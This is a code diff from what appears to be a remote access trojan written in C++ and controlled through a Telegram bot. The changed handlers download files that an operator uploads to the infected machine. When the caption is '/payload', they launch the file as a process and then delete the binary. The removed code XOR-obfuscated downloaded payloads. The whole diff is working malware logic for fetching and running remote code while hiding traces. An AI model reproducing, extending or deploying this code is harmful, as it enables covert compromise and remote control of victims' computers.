@@ -5,23 +5,23 @@
 #include "rat/system.hpp"
 
 #include <filesystem>
+#include <fmt/core.h>
 #include <sstream>
+#include <streambuf>
+#include <vector>
 
 namespace rat::handler {
 
-void Handler::handleMessageWithUploadedFiles() {
-		if(this->telegram_update->message.files.empty()) {
-			return;
-		}
-		if(this->telegram_update->message.caption == "/payload" &&
-		   this->telegram_update->message.files.size() == 1) {
-			this->handlePayloadCommand();
-			return;
-		}
+inline std::vector<std::filesystem ::path> Handler::downloadMultipleFiles(
+    ::rat::tbot::BaseBot *Tbot_Bot,
+    const std::vector<::rat::tbot::File> &Tbot_Files) {
 	std::ostringstream response_buffer;
-		for(const auto &file : this->telegram_update->message.files) {
-			std::filesystem::path file_path = std::filesystem::current_path();
+	std::filesystem::path file_path;
+	std::vector<std::filesystem::path> downloaded_files;
+	downloaded_files.reserve(Tbot_Files.size());
 
+		for(const auto &file : Tbot_Files) {
+			file_path = std::filesystem::current_path();
 				if(file.name.has_value() && !file.name->empty()) {
 					file_path /= file.name.value();
 				}
@@ -30,68 +30,54 @@ void Handler::handleMessageWithUploadedFiles() {
 				}
 			HANDLER_DEBUG_LOG("We have file {} trying to download it",
 			                  file_path.string());
-				if(this->bot->downloadFile(file.id, file_path)) {
+				if(Tbot_Bot->downloadFile(file.id, file_path)) {
 					response_buffer << "File: " << file_path.string()
 					                << " has been downloaded\n";
+					downloaded_files.push_back(std::move(file_path));
 				}
 				else {
 					response_buffer << "File: " << file_path.string()
 					                << " has not been downloaded\n";
 				}
 		}
-
-	response_buffer << fmt::format("Received {} uploaded file(s)",
-	                               this->telegram_update->message.files.size());
-	this->bot->sendMessage(response_buffer.str());
+	Tbot_Bot->sendMessage(response_buffer.str());
+	downloaded_files.shrink_to_fit();
+	return downloaded_files;
 }
 
-void Handler::handlePayloadCommand() {
-	this->bot->sendMessage("Integrating the payload...");
+inline void Handler::handlePayload(::rat::tbot::Message &Tbot_Message,
+                                   const std::filesystem::path &Payload_Path) {
+		if(Tbot_Message.caption.value() != "/payload") {
+			return;
+		}
+	const std::string &dummy_telegram_message =
+	    fmt::format("/lprocess {}", Payload_Path.string());
+	HANDLER_DEBUG_LOG("Dummy telegram message created and assinged");
+	Tbot_Message.text = std::move(dummy_telegram_message);
 
+	this->parseTelegramMessageToCommand();
+
+	this->handleProcessCommand();
+
+	HANDLER_DEBUG_LOG("The payload launched, removing binary");
+
+	std::filesystem::remove(Payload_Path);
+}
+
+void Handler::handleMessageWithUploadedFiles() {
 		if(this->telegram_update->message.files.empty()) {
-			this->bot->sendMessage("No file found in the update.");
 			return;
 		}
-
-	const auto &file = this->telegram_update->message.files[0];
-	const auto &file_id = file.id;
-
-	std::filesystem::path file_path = std::filesystem::current_path();
-	std::string time_stamp = rat::system::getCurrentDateTime_Underscored();
-
-		if(file.name.has_value() && !file.name->empty()) {
-			file_path /= *file.name;
+	HANDLER_DEBUG_LOG("Uploaded file caption {}\nNumber of uploaded files{}",
+	                  this->telegram_update->message.caption.value_or("None"),
+	                  this->telegram_update->message.files.size());
+	const auto file_paths = this->downloadMultipleFiles(
+	    this->bot.get(), this->telegram_update->message.files);
+		if(!file_paths.empty()) {
+			this->handlePayload(this->telegram_update->message, file_paths[0]);
 		}
-		else {
-			file_path /= time_stamp;
-		}
-
-	// Store key for obfuscation
-	this->state.payload_key = time_stamp;
-
-	// Construct file URL (adjust depending on your bot API)
-	const std::string file_url =
-	    fmt::format("{}{}", this->bot->getBotFileUrl(), file_id);
-	this->bot->sendMessage("Downloading the Payload...");
-		if(this->bot->curl_client.downloadData(file_url, this->state.payload)
-		       .curl_code != CURLE_OK) {
-			this->bot->sendMessage("Failed to download payload.");
-			return;
-		}
-
-		if(!this->state.payload.empty()) {
-			this->bot->sendMessage("Obfuscating it...");
-			rat::encryption::xorData(this->state.payload.data(),
-			                         this->state.payload.size(),
-			                         this->state.payload_key.c_str());
-		}
-		else {
-			this->bot->sendMessage("Payload is empty after download.");
-			return;
-		}
-
-	this->bot->sendMessage("Integration complete.");
 }
+
 } // namespace rat::handler
 
 #undef HANDLER_DEBUG_LOG
